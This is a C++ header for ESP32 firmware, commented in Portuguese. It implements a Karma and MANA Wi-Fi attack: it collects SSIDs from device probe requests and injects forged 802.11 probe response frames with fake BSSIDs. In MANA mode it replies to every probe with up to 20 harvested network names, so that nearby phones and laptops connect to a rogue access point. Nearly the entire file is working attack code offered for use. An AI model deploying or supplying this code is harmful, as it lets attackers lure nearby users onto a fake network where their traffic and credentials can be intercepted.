#pragma once
#include <Arduino.h>
#include <esp_wifi.h>
#include <vector>
#include <unordered_set>
#include "../utils/logger.h"

/*
 * Karma + MANA Attack
 *
 * Karma: responde a probe requests com AP falso idêntico ao SSID pedido.
 * MANA:  modo agressivo — responde a QUALQUER probe com TODOS os SSIDs
 *        conhecidos coletados anteriormente, maximizando associações.
 *        Ref: Dominic White & Ian de Villiers (SensePost, DEF CON 22, 2014)
 */
class KarmaAttack {
public:
    static KarmaAttack& get() { static KarmaAttack inst; return inst; }

    bool running   = false;
    bool manaMode  = false;   // true = MANA (responde com todos SSIDs conhecidos)
    std::vector<String> respondedTo;
    std::vector<String> knownSSIDs;       // todos SSIDs vistos em probes (ordenado para iteração)
    std::unordered_set<String> _knownSet; // lookup O(1)

    void start(bool mana = false) {
        running  = true;
        manaMode = mana;
        respondedTo.clear();
        LOG.warn(mana ? "[KARMA+MANA] Ativo — respondendo com TODOS SSIDs conhecidos"
                      : "[KARMA] Ativo — respondendo a probe requests...");
    }

    void stop() {
        running  = false;
        manaMode = false;
        LOG.info("[KARMA] Parado. SSIDs respondidos: " + String(respondedTo.size()) +
                 " | SSIDs conhecidos: " + String(knownSSIDs.size()));
    }

    void onProbe(const uint8_t* clientMac, const char* ssid, uint8_t ch) {
        if (!running) return;
        // Ignora probes originados pelo próprio ESP32
        uint8_t apMac[6], staMac[6];
        esp_wifi_get_mac(WIFI_IF_AP,  apMac);
        esp_wifi_get_mac(WIFI_IF_STA, staMac);
        if (memcmp(clientMac, apMac,  6) == 0) return;
        if (memcmp(clientMac, staMac, 6) == 0) return;

        // Acumula SSIDs conhecidos (usado pelo MANA e pelo Wifite)
        if (ssid && strlen(ssid) > 0) {
            String s = String(ssid);
            if (_knownSet.find(s) == _knownSet.end() && knownSSIDs.size() < 256) {
                knownSSIDs.push_back(s);
                _knownSet.insert(s);
            }
        }

        if (manaMode) {
            // MANA: responde ao dispositivo com cada SSID conhecido
            // Limita a 20 por probe para não saturar o rádio
            uint8_t sent = 0;
            for (auto& known : knownSSIDs) {
                _sendProbeResponse(clientMac, known.c_str(), ch);
                if (++sent >= 20) break;
            }
            // Também responde com o SSID pedido (caso não esteja na lista)
            if (ssid && strlen(ssid) > 0) _sendProbeResponse(clientMac, ssid, ch);
        } else {
            // Karma padrão: responde apenas com o SSID pedido
            if (!ssid || strlen(ssid) == 0) return;
            _sendProbeResponse(clientMac, ssid, ch);
        }

        if (ssid && strlen(ssid) > 0) {
            String s = String(ssid);
            bool found = false;
            for (auto& r : respondedTo) if (r == s) { found = true; break; }
            if (!found) {
                respondedTo.push_back(s);
                LOG.success(String(manaMode ? "[MANA]" : "[KARMA]") +
                            " → \"" + s + "\" ch" + String(ch));
            }
        }
    }

private:
    void _sendProbeResponse(const uint8_t* da, const char* ssid, uint8_t ch) {
        uint8_t ssidLen = strlen(ssid);
        if (ssidLen > 32) ssidLen = 32;
        uint8_t frame[128] = {};
        // BSSID único por SSID (deriva do hash do nome para evitar colisões)
        uint8_t fakeBSSID[6] = {0x02, 0xAA, 0xBB,
            (uint8_t)(ssidLen ^ 0xCC),
            (uint8_t)(ssid[0] ^ 0xDD),
            (uint8_t)(ch & 0xFF)};

        frame[0] = 0x50; frame[1] = 0x00; // Probe Response
        frame[2] = 0x00; frame[3] = 0x00;
        memcpy(frame +  4, da,        6);
        memcpy(frame + 10, fakeBSSID, 6);
        memcpy(frame + 16, fakeBSSID, 6);
        frame[22] = 0x00; frame[23] = 0x00;

        uint8_t off = 24;
        uint64_t ts = esp_timer_get_time();
        memcpy(frame + off, &ts, 8); off += 8;
        frame[off++] = 0x64; frame[off++] = 0x00; // beacon interval
        frame[off++] = 0x11; frame[off++] = 0x04; // capabilities ESS+Privacy
        frame[off++] = 0x00; frame[off++] = ssidLen;
        memcpy(frame + off, ssid, ssidLen); off += ssidLen;
        frame[off++] = 0x01; frame[off++] = 0x08;
        const uint8_t rates[] = {0x82,0x84,0x8B,0x96,0x24,0x30,0x48,0x6C};
        memcpy(frame + off, rates, 8); off += 8;
        frame[off++] = 0x03; frame[off++] = 0x01; frame[off++] = ch;

        esp_wifi_80211_tx(WIFI_IF_AP, frame, off, false);
    }
};
